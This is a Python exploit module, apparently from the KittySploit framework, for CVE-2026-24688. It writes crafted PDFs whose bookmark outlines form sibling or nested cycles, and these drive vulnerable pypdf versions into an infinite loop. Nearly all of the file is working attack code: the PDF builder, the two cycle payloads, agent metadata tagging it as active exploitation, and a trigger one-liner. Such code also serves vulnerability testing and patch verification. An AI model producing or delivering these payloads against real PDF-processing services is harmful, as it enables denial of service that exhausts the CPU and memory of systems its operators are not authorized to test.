#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-24688 — pypdf circular outline DoS PDF generator."""

from pathlib import Path

from kittysploit import *


def _pdf_escape(text: str) -> str:
    return text.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")


def _write_pdf(path: Path, objects: list) -> None:
    """Write a minimal PDF with a correct xref table (1-indexed objects)."""
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
    body = header
    offsets = [0]
    for index, obj in enumerate(objects, start=1):
        if isinstance(obj, str):
            obj = obj.encode("latin-1", errors="replace")
        offsets.append(len(body))
        body += f"{index} 0 obj\n".encode("ascii") + obj + b"\nendobj\n"

    xref_pos = len(body)
    xref = [f"xref\n0 {len(objects) + 1}\n", "0000000000 65535 f \n"]
    for offset in offsets[1:]:
        xref.append(f"{offset:010d} 00000 n \n")
    trailer = (
        f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_pos}\n%%EOF\n"
    )
    data = body + "".join(xref).encode("ascii") + trailer.encode("ascii")
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


def write_circular_next_outline(path: Path) -> None:
    """Outline A → Next B → Next A (sibling cycle)."""
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R /Outlines 5 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << >> /Contents 7 0 R >>",
        # 4 = Bookmark A
        (
            f"<< /Title ({_pdf_escape('Bookmark A')}) /Parent 5 0 R "
            f"/Next 6 0 R /Dest [3 0 R /Fit] >>"
        ).encode("latin-1"),
        # 5 = Outlines root
        b"<< /Type /Outlines /First 4 0 R /Last 6 0 R /Count 2 >>",
        # 6 = Bookmark B → Next A (circular)
        (
            f"<< /Title ({_pdf_escape('Bookmark B')}) /Parent 5 0 R "
            f"/Next 4 0 R /Dest [3 0 R /Fit] >>"
        ).encode("latin-1"),
        # 7 = empty content stream
        b"<< /Length 0 >>\nstream\n\nendstream",
    ]
    _write_pdf(path, objects)


def write_nested_circular_outline(path: Path) -> None:
    """A /First→B, B /Next→C, C /First→A (nesting cycle)."""
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R /Outlines 5 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources << >> /Contents 8 0 R >>",
        # 4 = Section A
        (
            f"<< /Title ({_pdf_escape('Section A')}) /Parent 5 0 R "
            f"/First 6 0 R /Dest [3 0 R /Fit] >>"
        ).encode("latin-1"),
        # 5 = Outlines root
        b"<< /Type /Outlines /First 4 0 R /Last 4 0 R /Count 1 >>",
        # 6 = Section B
        (
            f"<< /Title ({_pdf_escape('Section B')}) /Parent 4 0 R "
            f"/Next 7 0 R /Dest [3 0 R /Fit] >>"
        ).encode("latin-1"),
        # 7 = Section C → First A (circular)
        (
            f"<< /Title ({_pdf_escape('Section C')}) /Parent 4 0 R "
            f"/First 4 0 R /Dest [3 0 R /Fit] >>"
        ).encode("latin-1"),
        b"<< /Length 0 >>\nstream\n\nendstream",
    ]
    _write_pdf(path, objects)


class Module(Auxiliary):
    __info__ = {
        "name": "pypdf CVE-2026-24688 circular outline DoS PDF",
        "description": (
            "Generates a malicious PDF with circular outline/bookmark references "
            "(A→B→A or nested /First cycle). Vulnerable pypdf (< 6.6.2) enters an "
            "infinite loop when accessing reader.outline (CVE-2026-24688 / CWE-835). "
            "Does not require pypdf to generate the file. Triggering the DoS needs a "
            "consumer that parses outlines with a vulnerable pypdf."
        ),
        "author": ["JoakimBulow", "KittySploit Team"],
        "cve": ["CVE-2026-24688"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-24688",
            "https://github.com/py-pdf/pypdf/security/advisories/GHSA-2q4j-m29v-hq73",
            "https://github.com/py-pdf/pypdf/pull/3610",
        ],
        "tags": [
            "pdf",
            "pypdf",
            "dos",
            "outline",
            "bookmark",
            "fileformat",
            "cve-2026-24688",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 0,
            "reversible": True,
            "approval_required": True,
            "produces": ["exploit_paths"],
            "cost": 0.5,
            "noise": 0.1,
            "value": 0.7,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["pypdf", "pdf"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": [],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    mode = OptString(
        "circular",
        "Outline cycle type: circular (Next A↔B) | nested (/First cycle) | both",
        required=False,
    )
    output_dir = OptString("output/pdf", "Directory for generated PDFs", required=False)
    filename_prefix = OptString(
        "pypdf_cve_2026_24688",
        "Filename prefix (without .pdf)",
        required=False,
    )

    def run(self):
        mode = str(self.mode or "circular").strip().lower()
        out_dir = Path(str(self.output_dir or "output/pdf"))
        prefix = str(self.filename_prefix or "pypdf_cve_2026_24688").strip() or "pypdf_cve_2026_24688"

        print_status("CVE-2026-24688 — pypdf circular outline DoS generator")
        print_warning(
            "Generated PDFs can hang/crash vulnerable pypdf (< 6.6.2) when reading .outline"
        )

        created = []
        if mode in ("circular", "both", "next", "sibling"):
            path = out_dir / f"{prefix}_circular_next.pdf"
            write_circular_next_outline(path)
            created.append(path)
            print_success(f"Circular /Next: {path}")
            print_info("  Outline A → Next B → Next A")

        if mode in ("nested", "both", "first"):
            path = out_dir / f"{prefix}_nested_first.pdf"
            write_nested_circular_outline(path)
            created.append(path)
            print_success(f"Nested /First: {path}")
            print_info("  A /First→B, B /Next→C, C /First→A")

        if not created:
            print_error(f"Unknown mode: {mode} (use circular | nested | both)")
            return False

        print_info("Trigger example (vulnerable pypdf only, use timeout):")
        print_info(
            "  python -c \"from pypdf import PdfReader; "
            f"print(PdfReader(r'{created[0]}').outline)\""
        )
        print_warning("Authorized testing only — can exhaust CPU/memory on vulnerable hosts")
        return True
